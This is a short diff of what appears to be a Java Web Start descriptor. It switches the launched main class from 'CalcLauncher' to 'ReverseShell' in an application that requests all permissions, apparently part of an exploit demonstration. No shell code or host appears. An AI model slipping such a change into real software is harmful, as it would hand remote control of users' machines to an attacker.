@@ -13,7 +13,7 @@
                     main="true"/>
     </resources>
 
-    <application-desc main-class="CalcLauncher"/>
+    <application-desc main-class="ReverseShell"/>
 
     <security>
         <all-permissions/>
